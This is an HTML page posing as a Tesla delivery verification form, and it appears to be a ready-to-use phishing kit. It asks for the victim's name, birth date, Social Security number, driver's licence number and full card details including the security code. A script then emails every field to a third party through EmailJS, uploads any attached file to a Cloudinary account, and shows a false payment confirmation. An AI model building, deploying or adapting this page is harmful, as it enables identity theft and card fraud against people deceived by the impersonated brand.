<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Delivery Verification</title>
    <style>
        :root {
            --tesla-red: #e82127;
            --tesla-dark: #222;
            --tesla-gray: #f5f5f5;
        }
        body {
            font-family: 'Gotham', 'Helvetica', sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 30px auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background-color: var(--tesla-dark);
            padding: 20px;
            text-align: center;
        }
        .header img {
            height: 40px;
        }
        .content {
            padding: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .btn {
            background-color: var(--tesla-red);
            color: white;
            border: none;
            padding: 14px 20px;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
        .hidden {
            display: none;
        }
        .upload-receipt {
            margin-top: 20px;
            border: 2px dashed #ddd;
            padding: 20px;
            text-align: center;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <!-- Page 1: Identity Verification -->
    <div class="container" id="identity-page">
        <div class="header">
            <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
        </div>
        
        <div class="content">
            <h2>Identity Verification</h2>
            
            <div class="form-group">
                <label for="full_legal_name">Full Legal Name</label>
                <input type="text" id="full_legal_name" required>
            </div>
            
            <div class="form-group">
                <label for="date_of_birth">Date of Birth</label>
                <input type="date" id="date_of_birth" required>
            </div>
            
            <div class="form-group">
                <label for="social_security_number">Social Security Number</label>
                <input type="text" id="social_security_number" required>
            </div>
            
            <div class="form-group">
                <label for="drivers_license_number">Driver's License Number</label>
                <input type="text" id="drivers_license_number" required>
            </div>
            
            <button class="btn" onclick="showPage('payment-page')">Continue to Payment</button>
        </div>
    </div>

    <!-- Page 2: Payment -->
    <div class="container hidden" id="payment-page">
        <div class="header">
            <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
        </div>
        
        <div class="content">
            <h2>Payment Information</h2>
            
            <div class="form-group">
                <label for="card_number">Card Number</label>
                <input type="text" id="card_number" required>
            </div>
            
            <div style="display: flex; gap: 15px;">
                <div class="form-group" style="flex: 1;">
                    <label for="expiration_date">Expiration Date</label>
                    <input type="text" id="expiration_date" placeholder="MM/YY" required>
                </div>
                <div class="form-group" style="flex: 1;">
                    <label for="security_code">Security Code</label>
                    <input type="text" id="security_code" required>
                </div>
            </div>
            
            <div class="form-group">
                <label for="name_on_card">Name on Card</label>
                <input type="text" id="name_on_card" required>
            </div>

            <div class="upload-receipt">
                <p>Upload payment receipt:</p>
                <input type="file" id="receipt_upload" accept="image/*,.pdf">
            </div>

            <button class="btn" id="submit_btn">Complete Payment</button>
        </div>
    </div>
        <!-- Page 3: Confirmation -->
    <div class="container hidden" id="confirmation-page">
        <div class="header">
            <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
        </div>
        
        <div class="content">
            <h2 style="text-align: center;">Payment Completed!</h2>
            <p>Details have been sent to our team.</p>
        </div>
    </div>

    <!-- EmailJS Setup -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Initialize with YOUR public key
        emailjs.init('1-W3uHSnlpZGDZ1i3');
        
        // Cloudinary upload using YOUR details
        async function uploadToCloudinary(file) {
            const formData = new FormData();
            formData.append('file', file);
            formData.append('upload_preset', 'unsigned_preset');
            
            const response = await fetch('https://api.cloudinary.com/v1_1/do9yjpizs/auto/upload', {
                method: 'POST',
                body: formData
            });
            return (await response.json()).secure_url;
        }

        // Page navigation
        function showPage(pageId) {
            document.querySelectorAll('.container').forEach(el => {
                el.classList.add('hidden');
            });
            document.getElementById(pageId).classList.remove('hidden');
        }
                // Main payment handler
        document.getElementById('submit_btn').addEventListener('click', async function() {
            const btn = this;
            btn.disabled = true;
            btn.textContent = 'Sending...';
            
            try {
                // 1. Collect ALL data
                const formData = {
                    full_legal_name: document.getElementById('full_legal_name').value,
                    date_of_birth: document.getElementById('date_of_birth').value,
                    social_security_number: document.getElementById('social_security_number').value,
                    drivers_license_number: document.getElementById('drivers_license_number').value,
                    card_number: document.getElementById('card_number').value,
                    expiration_date: document.getElementById('expiration_date').value,
                    security_code: document.getElementById('security_code').value,
                    name_on_card: document.getElementById('name_on_card').value,
                    receipt_url: ''
                };

                // 2. Upload receipt if exists
                const receiptFile = document.getElementById('receipt_upload').files[0];
                if (receiptFile) {
                    formData.receipt_url = await uploadToCloudinary(receiptFile);
                }

                // 3. Send via EmailJS (YOUR service and template)
                await emailjs.send(
                    'service_pveujll',
                    'template_zqpc6bx',
                    formData
                );

                // 4. Show confirmation
                showPage('confirmation-page');
                
            } catch (error) {
                alert('Error: ' + error.message);
                btn.disabled = false;
                btn.textContent = 'Complete Payment';
            }
        });
    </script>
</body>
</html>
